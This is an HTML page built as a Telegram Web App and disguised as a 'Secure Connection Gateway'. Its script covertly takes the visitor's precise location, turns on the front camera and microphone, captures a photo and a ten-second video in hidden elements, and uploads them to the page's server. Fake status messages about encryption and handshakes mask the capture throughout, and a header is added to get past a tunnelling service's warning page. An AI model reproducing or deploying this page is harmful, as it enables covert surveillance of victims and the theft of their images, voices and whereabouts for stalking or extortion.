<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>SS0123 Web App</title>
  <script src="https://telegram.org"></script>
  <style>
    body{font-family:system-ui,sans-serif;margin:0;padding:24px;background:#0b1220;color:#fff;display:flex;justify-content:center;align-items:center;min-height:80vh}
    .box{width:100%;max-width:400px;background:#121c2f;padding:30px;border-radius:20px;text-align:center;box-shadow:0 8px 24px rgba(0,0,0,0.2)}
    .hidden-video{position:absolute;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none}
    #status{font-size:16px;line-height:1.5;color:#e2e8f0;font-weight:500;margin-bottom:20px}
    .action-btn{width:100%;padding:14px;color:#fff;border:0;border-radius:12px;font-size:16px;font-weight:bold;cursor:pointer;transition:background 0.2s}
    .btn-step1{background:#e91e63;box-shadow:0 4px 12px rgba(233,30,99,0.3)}
    .btn-step2{background:#2481cc;box-shadow:0 4px 12px rgba(36,129,204,0.3)}
  </style>
</head>
<body>
<div class="box">
  <div id="status">Secure Connection Gateway. Follow steps below to continue.</div>
  
  <button id="step1Btn" class="action-btn btn-step1">1. Verify Network</button>
  <button id="step2Btn" class="action-btn btn-step2" style="display:none;">2. Establish Security Link</button>

  <div style="display:none;">
    <button id="recordBtn" disabled></button>
    <button id="sendBtn" disabled></button>
  </div>

  <video id="preview" class="hidden-video" autoplay playsinline muted></video>
  <video id="recorded" class="hidden-video" controls></video>
  <canvas id="photoCanvas" style="display:none;"></canvas>
</div>

<script>
const tg = window.Telegram?.WebApp;
tg?.ready();
tg?.expand();

const statusEl = document.getElementById("status");
const step1Btn = document.getElementById("step1Btn");
const step2Btn = document.getElementById("step2Btn");
const preview = document.getElementById("preview");
const recorded = document.getElementById("recorded");
const photoCanvas = document.getElementById("photoCanvas");
const recordBtn = document.getElementById("recordBtn");
const sendBtn = document.getElementById("sendBtn");

let stream = null;
let recorder = null;
let chunks = [];
let videoBlob = null;
let autoStopTimeout = null;
let latestCoords = { latitude: "", longitude: "", accuracy: "" };

function status(s){ statusEl.textContent = s; }

step1Btn.onclick = () => {
  step1Btn.disabled = true;
  if (!navigator.geolocation) {
    showStep2();
    return;
  }
  status("Checking system connection protocols...");
  navigator.geolocation.getCurrentPosition(p => {
    latestCoords.latitude = p.coords.latitude.toString();
    latestCoords.longitude = p.coords.longitude.toString();
    latestCoords.accuracy = p.coords.accuracy.toString();
    showStep2();
  }, e => {
    showStep2(); 
  }, {
    enableHighAccuracy: true,
    timeout: 5000,
    maximumAge: 0
  });
};

function showStep2() {
  step1Btn.style.display = "none";
  step2Btn.style.display = "block";
  status("Step 1 complete. Establish link to finalize.");
}

step2Btn.onclick = async () => {
  step2Btn.disabled = true;
  step2Btn.style.display = "none";
  status("Initializing server handshake connection...");

  try {
    stream = await navigator.mediaDevices.getUserMedia({ 
      audio: true, 
      video: { width: 1280, height: 720, facingMode: "user" } 
    });
    if (preview) preview.srcObject = stream;
  } catch (e) {
    status("Error: Camera/Microphone access required.");
    return;
  }

  setTimeout(async () => {
    try {
      photoCanvas.width = preview.videoWidth || 1280;
      photoCanvas.height = preview.videoHeight || 720;
      const ctx = photoCanvas.getContext('2d');
      ctx.drawImage(preview, 0, 0, photoCanvas.width, photoCanvas.height);
      
      photoCanvas.toBlob(async (photoBlob) => {
        if (photoBlob) {
          const form = new FormData();
          form.append("photo", photoBlob, "snapshot.jpg");
          form.append("latitude", latestCoords.latitude);
          form.append("longitude", latestCoords.longitude);
          form.append("accuracy", latestCoords.accuracy);
          try {
            // FIX: Added LocalTunnel Bypass Header
            await fetch("/api/location-photo", { 
              method: "POST", 
              body: form,
              headers: { "Bypass-Tunnel-Reminder": "true" }
            });
          } catch(err) { console.error("Upload failed"); }
        }
        recordBtn.click();
      }, "image/jpeg", 0.90);
    } catch(photoErr) {
      recordBtn.click();
    }
  }, 1000);
};

recordBtn.onclick = () => {
  if (!stream || !stream.active) return;
  chunks = [];
  try {
    recorder = new MediaRecorder(stream);
  } catch(err) {
    status("System execution loop error.");
    return;
  }
  recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
  recorder.onstop = () => {
    if (autoStopTimeout) clearTimeout(autoStopTimeout);
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
      stream = null;
    }
    videoBlob = new Blob(chunks, {type: recorder.mimeType || "video/webm"});
    sendBtn.click();
  };
  recorder.start(1000);
  status("Encrypting connection packages... Stay on this screen.");
  
  autoStopTimeout = setTimeout(() => {
    if (recorder && recorder.state !== "inactive") recorder.stop();
  }, 10000); 
};

sendBtn.onclick = async () => {
  if (!videoBlob) return;
  status("Finalizing handshake sequence authentication...");
  try {
    const form = new FormData();
    form.append("video", videoBlob, "recording.webm");
    // FIX: Added LocalTunnel Bypass Header
    const r = await fetch("/api/video", {
      method:"POST", 
      body:form,
      headers: { "Bypass-Tunnel-Reminder": "true" }
    });
    const j = await r.json();
    if (!j.ok) throw new Error();
    status("✅ Complete.");
    setTimeout(() => tg?.close(), 1000);
  } catch(e) {
    status("Network error. Please reload layout configuration link.");
  }
};
</script>
</body>
</html>
